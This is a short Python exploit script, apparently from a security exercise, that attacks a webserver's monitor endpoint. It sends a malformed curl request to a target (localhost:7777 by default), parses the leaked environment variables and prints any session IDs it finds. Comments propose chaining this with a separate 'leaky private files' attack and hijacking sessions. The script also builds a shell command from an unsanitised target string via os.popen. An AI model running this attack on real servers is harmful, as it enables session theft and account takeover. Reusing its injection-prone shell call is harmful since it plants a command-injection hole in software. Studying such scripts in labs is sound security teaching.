### The webserver gives out session info to the monitor... nothing wrong with
### that right?
import json
import os

# NOTE: It's really tricky to get standard libraries to make the right request,
# since it violates the HTTP standard. Luckily curl has no qualms about doing
# dumb stuff. Or you could write a simple socket client to do the same.
def exploit(target):
    resp = os.popen(f'curl {target}/🙃').read()
    if '\n' not in resp:
        print('Something wrong with target server')
        return
    try:
        envvars = json.loads(resp.split('\n')[1])
    except json.JSONDecodeError:
        print('Something wrong with target server')
        return
    for k in envvars:
        if k.startswith('SID'):
            # We also have the encrypted blob in `envvars[k]`, you could combine
            # this with the leaky private files attack to decrypt.
            print(f'Stole session id: {k}')
    # ... or steal the session. We need to pair the SID with a user,
    # but can just try to match with recent messages for example.
    pass # TODO

TARGET = 'http://localhost:7777' # for example
exploit(TARGET)

